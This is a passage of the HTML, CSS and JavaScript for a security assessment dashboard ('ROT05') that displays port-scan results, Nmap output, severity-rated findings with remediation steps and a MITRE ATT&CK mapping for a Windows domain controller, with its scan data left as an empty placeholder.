  --bg:#07090F;--s0:#0C0F1C;--s1:#111525;--s2:#171C2E;
  --b:#1B2038;--b2:#252D4A;
  --a:#00C8FF;--ad:rgba(0,200,255,.08);
  --a2:#7C5CFC;--a2d:rgba(124,92,252,.10);
  --tx:#C0CCEC;--tx2:#566082;--tx3:#2E3554;
  --crit:#FF3355;--critd:rgba(255,51,85,.09);
  --high:#FF7733;--highd:rgba(255,119,51,.09);
  --med:#FFB300;--medd:rgba(255,179,0,.08);
  --low:#3399FF;--lowd:rgba(51,153,255,.08);
  --ok:#00E58A;--okd:rgba(0,229,138,.07);
  --led:0 0 6px currentColor;--sh:0 2px 20px rgba(0,0,0,.55);
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{font-family:system-ui,-apple-system,'Segoe UI',sans-serif;background:var(--bg);color:var(--tx);font-size:13px;display:flex;flex-direction:column;line-height:1.5}
button{font-family:inherit;font-size:inherit;cursor:pointer}
:focus-visible{outline:2px solid var(--a);outline-offset:2px}
@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:var(--s0)}
::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--tx3)}
.topbar{display:flex;align-items:center;gap:8px;height:44px;padding:0 16px;background:var(--s0);border-bottom:1px solid var(--b);flex-shrink:0;z-index:10}
.logo{font-family:'Courier New',monospace;font-size:15px;font-weight:700;letter-spacing:.14em;color:var(--a)}
.logo span{color:var(--a2)}
.tag{display:inline-flex;align-items:center;gap:5px;padding:2px 9px;border:1px solid var(--b);border-radius:3px;font-family:'Courier New',monospace;font-size:11px;color:var(--tx2);background:var(--s1);white-space:nowrap;flex-shrink:0}
.tag.live{border-color:rgba(0,229,138,.4);color:var(--ok)}
.dot{width:6px;height:6px;border-radius:50%;background:currentColor;flex-shrink:0}
.tbg{flex:1}
.rw{display:flex;align-items:center;gap:10px;padding:5px 12px;border:1px solid rgba(255,51,85,.4);border-radius:5px;background:var(--critd)}
.rn{font-family:'Courier New',monospace;font-size:22px;font-weight:700;color:var(--crit);line-height:1;font-variant-numeric:tabular-nums}
.rs{display:flex;flex-direction:column;gap:3px}
.rl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--crit);opacity:.75}
.clk{font-family:'Courier New',monospace;font-size:11px;color:var(--tx3);letter-spacing:.06em;font-variant-numeric:tabular-nums;min-width:58px;text-align:right}
.layout{display:flex;flex:1;overflow:hidden}
.sidebar{width:222px;flex-shrink:0;display:flex;flex-direction:column;background:var(--s0);border-right:1px solid var(--b);overflow-y:auto}
.sbs{padding:11px 13px;border-bottom:1px solid var(--b)}
.sbl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.14em;color:var(--tx3);margin-bottom:9px}
.hc{display:flex;align-items:flex-start;gap:10px}
.hi2{width:38px;height:38px;border-radius:7px;background:var(--ad);border:1px solid rgba(0,200,255,.35);display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0}
.hip{font-family:'Courier New',monospace;font-size:14px;font-weight:700;color:var(--a);line-height:1.2}
.hd2{font-size:11px;color:var(--tx2);margin-top:1px}
.ho{font-size:10px;color:var(--tx3)}
.hst{display:flex;align-items:center;gap:4px;font-size:9.5px;font-weight:600;color:var(--ok);margin-top:4px}
.sg2{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.sb2{background:var(--s1);border:1px solid var(--b);border-radius:5px;padding:8px 9px;text-align:center}
.sn2{font-family:'Courier New',monospace;font-size:21px;font-weight:700;line-height:1;font-variant-numeric:tabular-nums}
.sl2{font-size:9px;color:var(--tx2);text-transform:uppercase;letter-spacing:.07em;margin-top:3px}
.sb2.c .sn2{color:var(--crit)}.sb2.h .sn2{color:var(--high)}.sb2.p .sn2{color:var(--a)}.sb2.f .sn2{color:var(--med)}
#topo{width:100%;height:128px;display:block}
.mr{display:flex;justify-content:space-between;align-items:baseline;gap:8px;padding:4px 0;border-bottom:1px solid var(--b);font-size:11px}
.mr:last-child{border-bottom:none}
.mk{color:var(--tx2)}.mv{font-family:'Courier New',monospace;font-size:10.5px;color:var(--tx);text-align:right;word-break:break-all}
.main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
.pmw{flex-shrink:0;padding:7px 14px 8px;background:var(--s0);border-bottom:1px solid var(--b)}
.pmh{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px}
.pml{font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:var(--tx3);font-weight:600}
.pzs{display:flex;gap:12px}
.pz{font-size:9px;color:var(--tx3);display:flex;align-items:center;gap:4px}
.pz::before{content:'';display:inline-block;width:9px;height:6px;border-radius:1px}
.pz.wk::before{background:rgba(0,200,255,.28)}.pz.reg::before{background:rgba(0,200,255,.12)}
.pz.dyn::before{background:rgba(27,32,56,.9);border:1px solid var(--b)}
#portCanvas{display:block;width:100%;height:44px;border-radius:3px;cursor:crosshair}
.ctip{position:fixed;z-index:200;pointer-events:none;display:none;background:var(--s1);border:1px solid var(--b2);border-radius:4px;padding:5px 10px;font-family:'Courier New',monospace;font-size:11px;color:var(--tx);box-shadow:var(--sh)}
.tabs{display:flex;align-items:stretch;background:var(--s0);border-bottom:1px solid var(--b);flex-shrink:0;overflow-x:auto;scrollbar-width:none}
.tabs::-webkit-scrollbar{display:none}
.tab{display:flex;align-items:center;gap:6px;padding:0 14px;height:36px;font-size:12px;color:var(--tx2);cursor:pointer;border-bottom:2px solid transparent;user-select:none;transition:color .12s;white-space:nowrap}
.tab:hover{color:var(--tx)}.tab.on{color:var(--a);border-bottom-color:var(--a)}
.tn2{min-width:16px;height:15px;padding:0 4px;display:inline-flex;align-items:center;justify-content:center;border-radius:3px;font-size:9px;font-weight:700;background:var(--s2);border:1px solid var(--b);color:var(--tx3)}
.tab.on .tn2{background:var(--ad);border-color:rgba(0,200,255,.4);color:var(--a)}
.ctn{background:var(--critd)!important;border-color:rgba(255,51,85,.35)!important;color:var(--crit)!important}
.pane{display:none;flex:1;flex-direction:column;overflow:hidden}.pane.on{display:flex}
.toolbar{display:flex;align-items:center;gap:7px;padding:7px 14px;background:var(--s0);border-bottom:1px solid var(--b);flex-shrink:0}
.sbox{display:flex;align-items:center;gap:5px;padding:4px 9px;border:1px solid var(--b);border-radius:4px;background:var(--s1);width:210px;transition:border-color .12s}
.sbox:focus-within{border-color:rgba(0,200,255,.5)}
.sbox input{background:none;border:none;outline:none;color:var(--tx);font-size:12px;font-family:'Courier New',monospace;width:100%}
.sbox input::placeholder{color:var(--tx3)}
.si3{font-size:11px;color:var(--tx3)}
.chip{padding:3px 9px;border:1px solid var(--b);border-radius:10px;font-size:11px;color:var(--tx2);cursor:pointer;background:var(--s1);transition:all .1s;user-select:none}
.chip:hover{border-color:rgba(0,200,255,.5);color:var(--a)}.chip.on{background:var(--ad);border-color:rgba(0,200,255,.45);color:var(--a)}
.tw{overflow:auto;flex:1}
table{width:100%;border-collapse:collapse}
thead{position:sticky;top:0;z-index:1}
th{background:var(--s1);border-bottom:1px solid var(--b2);padding:7px 12px;font-size:9.5px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--tx3);text-align:left;white-space:nowrap}
th:first-child{padding-left:14px}
td{padding:7px 12px;border-bottom:1px solid var(--b);color:var(--tx2);vertical-align:middle}
td:first-child{padding-left:14px}
tr:hover td{background:var(--s2)}
.pn{font-family:'Courier New',monospace;font-weight:700;font-size:13px;color:var(--tx);font-variant-numeric:tabular-nums}
.stb{display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:600}
.led2{width:6px;height:6px;border-radius:50%;flex-shrink:0}
.led2.open{background:var(--ok);box-shadow:var(--led)}.led2.closed{background:var(--crit)}.led2.filtered{background:var(--med)}
.stb.open{color:var(--ok)}.stb.closed{color:var(--crit)}.stb.filtered{color:var(--med)}
.svn{font-weight:600;color:var(--tx);font-size:12px}
.vrs{font-family:'Courier New',monospace;font-size:10.5px;color:var(--tx2)}
.cveb{font-family:'Courier New',monospace;font-size:9px;font-weight:700;padding:1px 5px;border-radius:3px;background:var(--critd);border:1px solid rgba(255,51,85,.3);color:var(--crit);margin-left:5px}
.scg{display:grid;grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:10px;padding:14px;overflow:auto;flex:1;align-content:start}
.scard{background:var(--s1);border:1px solid var(--b);border-radius:6px;padding:11px 13px;transition:border-color .12s,background .1s;cursor:default}
.scard:hover{border-color:rgba(0,200,255,.4);background:var(--s2)}
.scp{font-family:'Courier New',monospace;font-size:10px;color:var(--tx3);margin-bottom:3px}
.scn{font-weight:700;font-size:13px;color:var(--tx);margin-bottom:2px}
.scv{font-family:'Courier New',monospace;font-size:10px;color:var(--tx2);line-height:1.4}
.scr{display:inline-block;margin-top:8px;font-size:9px;font-weight:700;padding:2px 6px;border-radius:3px;text-transform:uppercase;letter-spacing:.05em}
.scr.ca{background:var(--critd);color:var(--crit);border:1px solid rgba(255,51,85,.25)}
.scr.wa{background:var(--medd);color:var(--med);border:1px solid rgba(255,179,0,.25)}
.scr.ok2{background:var(--okd);color:var(--ok);border:1px solid rgba(0,229,138,.2)}
.nw{flex:1;overflow:auto;padding:14px}
.np{font-family:'Courier New',Courier,monospace;font-size:12px;line-height:1.8;color:var(--tx2);white-space:pre}
.np .hi{color:var(--tx);font-weight:600}.np .op{color:var(--ok)}.np .hd{color:var(--a);font-weight:600}
.np .vu{color:var(--crit)}.np .wn{color:var(--med)}
.fl{display:flex;flex:1;overflow:hidden}
.fclist{width:330px;flex-shrink:0;overflow-y:auto;border-right:1px solid var(--b)}
.fc{border-bottom:1px solid var(--b);cursor:pointer;transition:background .1s;display:flex;align-items:center;gap:9px;padding:11px 13px}
.fc:hover{background:var(--s2)}.fc.act{background:var(--ad);border-left:3px solid var(--a);padding-left:10px}
.sev{font-size:9px;font-weight:800;padding:2px 6px;border-radius:3px;text-transform:uppercase;letter-spacing:.06em;flex-shrink:0}
.sev.critical{background:var(--critd);color:var(--crit);border:1px solid rgba(255,51,85,.3)}
.sev.high{background:var(--highd);color:var(--high);border:1px solid rgba(255,119,51,.25)}
.sev.medium{background:var(--medd);color:var(--med);border:1px solid rgba(255,179,0,.22)}
.sev.low{background:var(--lowd);color:var(--low);border:1px solid rgba(51,153,255,.22)}
.fct{flex:1;font-size:12px;font-weight:600;color:var(--tx);min-width:0}
.fcm{font-family:'Courier New',monospace;font-size:9.5px;color:var(--tx3);flex-shrink:0}
.fd2{flex:1;overflow-y:auto;padding:20px}
.fdem{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;color:var(--tx3);font-size:12px;text-align:center}
.fdei{font-size:34px;opacity:.3}
.fdh{display:flex;align-items:flex-start;gap:10px;margin-bottom:18px;padding-bottom:16px;border-bottom:1px solid var(--b)}
.fdt{font-size:16px;font-weight:700;color:var(--tx);line-height:1.3;margin-bottom:6px}
.fdm{display:flex;gap:7px;flex-wrap:wrap;align-items:center}
.fdtag{font-family:'Courier New',monospace;font-size:10px;padding:2px 7px;border-radius:3px;background:var(--a2d);border:1px solid rgba(124,92,252,.35);color:var(--a2)}
.fdtac{font-size:10px;color:var(--tx3);padding:2px 7px;border-radius:3px;background:var(--s2);border:1px solid var(--b)}
.fds{margin-bottom:16px}
.fdsl{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.11em;color:var(--tx3);margin-bottom:7px}
.fdesc{font-size:12.5px;color:var(--tx2);line-height:1.68}
.fdev{font-family:'Courier New',monospace;font-size:11.5px;color:var(--ok);background:var(--okd);border:1px solid rgba(0,229,138,.15);border-radius:4px;padding:9px 12px;line-height:1.5}
.rl2{list-style:none;display:flex;flex-direction:column;gap:7px}
.rl2 li{display:flex;gap:9px;font-size:12px;color:var(--tx2);line-height:1.6}
.rn2{font-family:'Courier New',monospace;font-size:10px;font-weight:700;color:var(--a);min-width:20px;margin-top:2px}
.mw{flex:1;overflow:auto;padding:14px}
.mg{display:flex;gap:8px;min-width:max-content}
.mc{min-width:128px}
.mtac{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--tx3);padding:6px 8px;border-bottom:2px solid var(--b2);margin-bottom:6px;white-space:nowrap}
.mtech{font-family:'Courier New',monospace;font-size:10px;padding:4px 8px;border-radius:3px;margin-bottom:4px;color:var(--tx3);background:var(--s1);border:1px solid var(--b);white-space:nowrap}
.mtech.hit{background:var(--a2d);border-color:rgba(124,92,252,.4);color:var(--a2);font-weight:700}
.dw2{flex:1;overflow:auto;padding:14px;display:grid;grid-template-columns:1fr 1fr;gap:12px;align-content:start}
.db{background:var(--s1);border:1px solid var(--b);border-radius:6px;padding:12px 14px}
.db.wide{grid-column:1/-1}
.dt2{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--tx3);margin-bottom:10px}
.dr{display:flex;justify-content:space-between;align-items:baseline;gap:8px;padding:5px 0;border-bottom:1px solid var(--b);font-size:12px}
.dr:last-child{border-bottom:none}
.dk{color:var(--tx2)}.dv{font-family:'Courier New',monospace;font-size:11px;color:var(--tx);text-align:right}
.sbar{display:flex;align-items:center;gap:14px;padding:0 14px;height:26px;background:var(--s0);border-top:1px solid var(--b);flex-shrink:0;font-size:11px}
.si4{display:flex;align-items:center;gap:5px;color:var(--tx3)}
.si4 .d{width:6px;height:6px;border-radius:50%}
.si4.c .d{background:var(--crit)}.si4.h .d{background:var(--high)}.si4.m .d{background:var(--med)}.si4.p .d{background:var(--a)}
.sbr{margin-left:auto;color:var(--tx3);font-family:'Courier New',monospace;font-size:10px}
</style>
</head>
<body>
<div class="topbar">
  <span class="logo">ROT<span>05</span></span>
  <span id="t-ip" class="tag live"><span class="dot"></span>—</span>
  <span id="t-dom" class="tag">—</span>
  <span class="tag">DC · Windows Server</span>
  <div class="tbg"></div>
  <div class="rw" id="rw">
    <div class="rn" id="r-num">—</div>
    <div class="rs">
      <span class="rl">Risk Score</span>
      <svg width="70" height="8" style="display:block">
        <rect x="0" y="2" width="70" height="4" rx="2" fill="#1B2038"/>
        <defs><linearGradient id="rg" x1="0" y1="0" x2="1" y2="0">
          <stop offset="0%" stop-color="#00E58A"/><stop offset="55%" stop-color="#FFB300"/>
          <stop offset="100%" stop-color="#FF3355"/>
        </linearGradient></defs>
        <rect id="r-bar" x="0" y="2" width="0" height="4" rx="2" fill="url(#rg)"/>
      </svg>
      <span class="rl" id="r-cat">—</span>
    </div>
  </div>
  <span class="clk" id="clk">--:--:--</span>
</div>
<div class="layout">
<aside class="sidebar">
  <div class="sbs">
    <div class="sbl">Target Host</div>
    <div class="hc">
      <div class="hi2">&#x1F5A5;</div>
      <div>
        <div class="hip" id="s-ip">—</div>
        <div class="hd2" id="s-dom">—</div>
        <div class="ho">Windows Server</div>
        <div class="hst"><span class="dot"></span>Online · Domain Controller</div>
      </div>
    </div>
  </div>
  <div class="sbs">
    <div class="sbl">Attack Surface</div>
    <div class="sg2">
      <div class="sb2 p"><div class="sn2" id="s-ports">—</div><div class="sl2">Open Ports</div></div>
      <div class="sb2 f"><div class="sn2" id="s-finds">—</div><div class="sl2">Findings</div></div>
      <div class="sb2 c"><div class="sn2" id="s-crit">—</div><div class="sl2">Critical</div></div>
      <div class="sb2 h"><div class="sn2" id="s-high">—</div><div class="sl2">High</div></div>
    </div>
  </div>
  <div class="sbs"><div class="sbl">Network Topology</div><svg id="topo" viewBox="0 0 200 128"></svg></div>
  <div class="sbs" style="flex:1">
    <div class="sbl">Scan Metadata</div>
    <div class="mr"><span class="mk">Date</span><span class="mv" id="m-date">—</span></div>
    <div class="mr"><span class="mk">Username</span><span class="mv" id="m-user">—</span></div>
    <div class="mr"><span class="mk">Output</span><span class="mv" id="m-out">—</span></div>
  </div>
</aside>
<main class="main">
  <div class="pmw">
    <div class="pmh">
      <span class="pml">Port Density Map &nbsp;0 &#x2192; 65535</span>
      <div class="pzs">
        <span class="pz wk">Well-known</span>
        <span class="pz reg">Registered</span>
        <span class="pz dyn">Dynamic</span>
      </div>
    </div>
    <canvas id="portCanvas"></canvas>
  </div>
  <div class="tabs" role="tablist">
    <div class="tab on"  onclick="go('ports')">Ports <span class="tn2" id="tn-p">—</span></div>
    <div class="tab"     onclick="go('services')">Services</div>
    <div class="tab"     onclick="go('nmap')">Nmap Output</div>
    <div class="tab"     onclick="go('findings')">Findings <span class="tn2 ctn" id="tn-f">—</span></div>
    <div class="tab"     onclick="go('mitre')">MITRE ATT&amp;CK</div>
    <div class="tab"     onclick="go('details')">Host Details</div>
  </div>
  <div class="pane on" id="pane-ports">
    <div class="toolbar">
      <div class="sbox"><span class="si3">&#x2315;</span><input id="ps" type="text" placeholder="port, service, version&#x2026;" oninput="rp()" spellcheck="false"/></div>
      <div class="chip on" onclick="pf(this,'all')">All</div>
      <div class="chip"    onclick="pf(this,'open')">Open</div>
      <div class="chip"    onclick="pf(this,'closed')">Closed</div>
      <div class="chip"    onclick="pf(this,'filtered')">Filtered</div>
    </div>
    <div class="tw"><table><thead><tr><th>Port</th><th>State</th><th>Protocol</th><th>Service</th><th>Version / Flags</th></tr></thead><tbody id="ptb"></tbody></table></div>
  </div>
  <div class="pane" id="pane-services"><div class="scg" id="scg"></div></div>
  <div class="pane" id="pane-nmap"><div class="nw"><pre class="np" id="np"></pre></div></div>
  <div class="pane" id="pane-findings">
    <div class="toolbar">
      <div class="chip on"  onclick="ff(this,'all')">All <span class="tn2" id="fc-all">—</span></div>
      <div class="chip" style="color:var(--crit)" onclick="ff(this,'critical')">Critical <span class="tn2 ctn" id="fc-crit">—</span></div>
      <div class="chip" style="color:var(--high)" onclick="ff(this,'high')">High <span class="tn2" style="background:var(--highd);border-color:rgba(255,119,51,.3);color:var(--high)" id="fc-high">—</span></div>
      <div class="chip" style="color:var(--med)"  onclick="ff(this,'medium')">Medium <span class="tn2" style="background:var(--medd);border-color:rgba(255,179,0,.25);color:var(--med)" id="fc-med">—</span></div>
    </div>
    <div class="fl">
      <div class="fclist" id="fcl"></div>
      <div class="fd2" id="fdd"><div class="fdem"><div class="fdei">&#x26A1;</div><div>Select a finding to view details<br>and remediation steps</div></div></div>
    </div>
  </div>
  <div class="pane" id="pane-mitre"><div class="mw"><div class="mg" id="mg"></div></div></div>
  <div class="pane" id="pane-details"><div class="dw2" id="dw2"></div></div>
</main>
</div>
<div class="sbar">
  <div class="si4 c"><div class="d"></div><span id="sb-c">—</span></div>
  <div class="si4 h"><div class="d"></div><span id="sb-h">—</span></div>
  <div class="si4 m"><div class="d"></div><span id="sb-m">—</span></div>
  <div class="si4 p"><div class="d"></div><span id="sb-p">—</span></div>
  <div class="sbr" id="sbr">ROT05 Assessment Dashboard</div>
</div>
<div class="ctip" id="tip"></div>
<script>
/*__DATA__*/
const TABS=['ports','services','nmap','findings','mitre','details'];
let curTab='ports',pFilt='all',pSrch='',fFilt='all',aFid=null;

function go(t){
  curTab=t;
  document.querySelectorAll('.tab').forEach(function(el,i){el.classList.toggle('on',TABS[i]===t);});
  document.querySelectorAll('.pane').forEach(function(el){el.classList.remove('on');});
  document.getElementById('pane-'+t).classList.add('on');
}

function setRiskStyle(score,label){
  var colors={Critical:{b:'rgba(255,51,85,.45)',t:'#FF3355',bg:'rgba(255,51,85,.09)'},High:{b:'rgba(255,119,51,.4)',t:'#FF7733',bg:'rgba(255,119,51,.09)'},Medium:{b:'rgba(255,179,0,.35)',t:'#FFB300',bg:'rgba(255,179,0,.08)'},Low:{b:'rgba(0,229,138,.35)',t:'#00E58A',bg:'rgba(0,229,138,.07)'}};
  var c=colors[label]||colors.Low;
  var rw=document.getElementById('rw');
  rw.style.borderColor=c.b; rw.style.background=c.bg;
  document.getElementById('r-num').style.color=c.t;
  document.getElementById('r-cat').style.color=c.t;
  document.getElementById('r-bar').setAttribute('width',String(Math.round(score*0.7)));
}

function init(){
  var openP=D.ports.filter(function(p){return p.st==='open';}).length;
  var critC=D.finds.filter(function(f){return f.sev==='critical';}).length;
  var highC=D.finds.filter(function(f){return f.sev==='high';}).length;
  var medC =D.finds.filter(function(f){return f.sev==='medium';}).length;
  document.getElementById('t-ip').innerHTML='<span class="dot"></span>'+D.ip;
  document.getElementById('t-dom').textContent=D.domain||'—';
  document.getElementById('r-num').textContent=D.risk;
  document.getElementById('r-cat').textContent=(D.rlabel||'—').toUpperCase();
  setRiskStyle(D.risk, D.rlabel||'Low');
  document.getElementById('s-ip').textContent=D.ip;
  document.getElementById('s-dom').textContent=D.domain||'—';
  document.getElementById('s-ports').textContent=openP;
  document.getElementById('s-finds').textContent=D.finds.length;
  document.getElementById('s-crit').textContent=critC;
  document.getElementById('s-high').textContent=highC;
  document.getElementById('m-date').textContent=D.date||'—';
  document.getElementById('m-user').textContent=D.user||'—';
  document.getElementById('m-out').textContent=D.output||'—';
  document.getElementById('tn-p').textContent=openP;
  document.getElementById('tn-f').textContent=D.finds.length;
  document.getElementById('fc-all').textContent=D.finds.length;
  document.getElementById('fc-crit').textContent=critC;
  document.getElementById('fc-high').textContent=highC;
  document.getElementById('fc-med').textContent=medC;
  document.getElementById('sb-c').textContent=critC+' Critical';
  document.getElementById('sb-h').textContent=highC+' High';
  document.getElementById('sb-m').textContent=medC+' Medium';
  document.getElementById('sb-p').textContent=openP+' Open Ports';
}

function rp(){pSrch=document.getElementById('ps').value.toLowerCase();renderPorts();}
function pf(el,f){
  pFilt=f;
  document.querySelectorAll('#pane-ports .chip').forEach(function(c){c.classList.remove('on');});
  el.classList.add('on');
  renderPorts();
}
function renderPorts(){
  var rows=D.ports.filter(function(p){
    if(pFilt!=='all'&&p.st!==pFilt)return false;
    if(pSrch&&!String(p.p).includes(pSrch)&&!(p.svc||'').includes(pSrch)&&!(p.ver||'').toLowerCase().includes(pSrch))return false;
    return true;
  });
  document.getElementById('ptb').innerHTML=rows.map(function(p){
    var cves=(p.cves||[]).map(function(c){return'<span class="cveb">'+c+'</span>';}).join('');
    return'<tr><td><span class="pn">'+p.p+'/'+p.pr+'</span></td>'
      +'<td><span class="stb '+p.st+'"><span class="led2 '+p.st+'"></span>'+p.st+'</span></td>'
      +'<td style="font-size:11px;color:var(--tx3)">'+p.pr.toUpperCase()+'</td>'
      +'<td><span class="svn">'+(p.svc||'')+'</span></td>'
      +'<td><span class="vrs">'+(p.ver||'—')+'</span>'+cves+'</td></tr>';
  }).join('');
}

function renderServices(){
  var RISK={'microsoft-ds':'ca','ms-wbt-server':'wa','ldap':'wa','netbios-ssn':'wa','http':'wa','kerberos-sec':'ok2','domain':'ok2','msrpc':'ok2','kpasswd5':'ok2','ncacn_http':'ok2','ssl/ldap':'ok2','mc-nmf':'ok2'};
  var LBL={ca:'Attention',wa:'Review',ok2:'Standard'};
  document.getElementById('scg').innerHTML=D.ports.filter(function(p){return p.st==='open';}).map(function(p){
    var r=RISK[p.svc||'']||'ok2';
    var cvs=(p.cves||[]).length?'<div style="margin-top:5px">'+(p.cves||[]).map(function(c){return'<span class="cveb">'+c+'</span>';}).join(' ')+'</div>':'';
    return'<div class="scard"><div class="scp">'+p.p+'/'+p.pr+'</div><div class="scn">'+(p.svc||'')+'</div><div class="scv">'+(p.ver||'Unknown version')+'</div>'+cvs+'<div class="scr '+r+'">'+LBL[r]+'</div></div>';
  }).join('');
}

function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function renderNmap(){
  document.getElementById('np').innerHTML=(D.nmap||'(no nmap output available)').split('\n').map(function(l){
    if(/^\d+\/tcp\s+open/.test(l.trim()))return'<span class="op">'+esc(l)+'</span>';
    if(/VULNERABLE|Risk factor|CVE:/i.test(l))return'<span class="vu">'+esc(l)+'</span>';
    if(/^(Starting Nmap|Nmap done|Nmap scan report)/.test(l))return'<span class="hi">'+esc(l)+'</span>';
    if(/^(PORT\s+STATE|Host script results)/.test(l.trim()))return'<span class="hd">'+esc(l)+'</span>';
    if(/signing enabled but not required/i.test(l))return'<span class="wn">'+esc(l)+'</span>';
    return esc(l);
  }).join('\n');
}

function ff(el,f){
  fFilt=f;
  document.querySelectorAll('#pane-findings .toolbar .chip').forEach(function(c){c.classList.remove('on');});
  el.classList.add('on');
  renderFinds();
}
function renderFinds(){
  var list=D.finds.filter(function(f){return fFilt==='all'||f.sev===fFilt;});
  document.getElementById('fcl').innerHTML=list.map(function(f){
    return'<div class="fc'+(aFid===f.id?' act':'')+'" data-id="'+f.id+'">'
      +'<span class="sev '+f.sev+'">'+f.sev+'</span>'
      +'<span class="fct">'+f.title+'</span>'
      +'<span class="fcm">'+(f.mitre||'')+'</span>'
      +'</div>';
  }).join('');
}
document.addEventListener('DOMContentLoaded',function(){
  document.getElementById('fcl').addEventListener('click',function(e){
    var fc=e.target.closest('.fc');
    if(fc&&fc.dataset.id)selF(fc.dataset.id);
  });
});
function selF(id){
  aFid=id;
  renderFinds();
  var f=D.finds.find(function(x){return x.id===id;});
  if(!f)return;
  document.getElementById('fdd').innerHTML=
    '<div class="fdh">'
    +'<div style="flex-shrink:0;margin-top:2px"><span class="sev '+f.sev+'">'+f.sev+'</span></div>'
    +'<div><div class="fdt">'+f.title+'</div>'
    +'<div class="fdm"><span class="fdtag">'+(f.mitre||'')+'</span>'
    +(f.tac?'<span class="fdtac">'+f.tac+'</span>':'')
    +'</div></div></div>'
    +'<div class="fds"><div class="fdsl">Description</div><div class="fdesc">'+(f.desc||'')+'</div></div>'
    +'<div class="fds"><div class="fdsl">Evidence</div><div class="fdev">'+(f.ev||'No evidence recorded')+'</div></div>'
    +'<div class="fds"><div class="fdsl">Remediation Steps</div><ol class="rl2">'
    +(f.rem||[]).map(function(r,i){return'<li><span class="rn2">0'+(i+1)+'</span><span>'+r+'</span></li>';}).join('')
    +'</ol></div>';
}

function renderMitre(){
  document.getElementById('mg').innerHTML=Object.entries(D.mitre).map(function(entry){
    var tac=entry[0],techs=entry[1];
    return'<div class="mc"><div class="mtac">'+tac+'</div>'
      +(techs.length?techs.map(function(t){return'<div class="mtech hit">'+t+'</div>';}).join(''):'<div class="mtech">&#x2014;</div>')
      +'</div>';
  }).join('');
}

function renderDet(){
  var openP=D.ports.filter(function(p){return p.st==='open';}).length;
  var critC=D.finds.filter(function(f){return f.sev==='critical';}).length;
  var highC=D.finds.filter(function(f){return f.sev==='high';}).length;
  var medC =D.finds.filter(function(f){return f.sev==='medium';}).length;
  var lowC =D.finds.filter(function(f){return f.sev==='low';}).length;
  var cveP =D.ports.filter(function(p){return(p.cves||[]).length>0;}).length;
  document.getElementById('dw2').innerHTML=
    '<div class="db wide"><div class="dt2">Target Information</div>'
    +[['IP Address',D.ip],['Domain',D.domain||'—'],['Username',D.user||'—'],
      ['Operating System','Windows Server (detected)'],['Role','Domain Controller'],
      ['Scan Date',D.date||'—'],['Output Directory',D.output||'—']
     ].map(function(kv){return'<div class="dr"><span class="dk">'+kv[0]+'</span><span class="dv">'+kv[1]+'</span></div>';}).join('')
    +'</div>'
    +'<div class="db"><div class="dt2">Finding Summary</div>'
    +[['Critical',critC],['High',highC],['Medium',medC],['Low',lowC],['Total',D.finds.length]]
     .map(function(kv){return'<div class="dr"><span class="dk">'+kv[0]+'</span><span class="dv">'+kv[1]+'</span></div>';}).join('')
    +'</div>'
    +'<div class="db"><div class="dt2">Port Summary</div>'
    +[['Open Ports',openP],['Total Discovered',D.ports.length],
      ['CVE-tagged Ports',cveP],['Risk Score',D.risk+'/100 ('+D.rlabel+')']]
     .map(function(kv){return'<div class="dr"><span class="dk">'+kv[0]+'</span><span class="dv">'+kv[1]+'</span></div>';}).join('')
    +'</div>';
}

function drawCanvas(){
  var c=document.getElementById('portCanvas');
  var dpr=window.devicePixelRatio||1;
  var W=c.parentElement.clientWidth-28,H=44;
  c.width=W*dpr;c.height=H*dpr;c.style.width=W+'px';c.style.height=H+'px';
  var ctx=c.getContext('2d');ctx.scale(dpr,dpr);
  ctx.fillStyle='#0C0F1C';ctx.fillRect(0,0,W,H);
  var wkW=(1023/65535)*W,regW=(49151/65535)*W;
  ctx.fillStyle='rgba(0,200,255,0.18)';ctx.fillRect(0,0,wkW,H);
  ctx.fillStyle='rgba(0,200,255,0.07)';ctx.fillRect(wkW,0,regW-wkW,H);
  ctx.strokeStyle='rgba(27,32,56,0.9)';ctx.lineWidth=1;ctx.setLineDash([2,4]);
  [1023,49151].forEach(function(p){var x=(p/65535)*W;ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke();});
  ctx.setLineDash([]);
  D.ports.filter(function(p){return p.st==='open';}).forEach(function(p){
    var x=(p.p/65535)*W,hasCve=(p.cves||[]).length>0;
    if(hasCve){ctx.shadowColor='#FF3355';ctx.shadowBlur=10;ctx.fillStyle='#FF3355';ctx.globalAlpha=.95;}
    else{ctx.shadowBlur=0;ctx.fillStyle='#00C8FF';ctx.globalAlpha=.7;}
    ctx.fillRect(Math.max(0,x-1.5),5,3.5,H-10);
  });
  ctx.shadowBlur=0;ctx.globalAlpha=1;
  ctx.fillStyle='rgba(46,53,84,0.9)';
  ctx.font=(9*dpr)+'px "Courier New",monospace';
  ctx.scale(1/dpr,1/dpr);
  [['0',3],['1024',wkW+3],['49152',(49151/65535*W)+3],['65535',W-38]].forEach(function(kv){
    ctx.fillText(kv[0],kv[1]*dpr,(H-3)*dpr);
  });
}

(function(){
  var c=document.getElementById('portCanvas'),tip=document.getElementById('tip');
  c.addEventListener('mousemove',function(e){
    var r=c.getBoundingClientRect(),x=e.clientX-r.left;
    var hit=D.ports.filter(function(p){return p.st==='open';}).reduce(function(b,p){
      var px=(p.p/65535)*r.width,d=Math.abs(px-x);
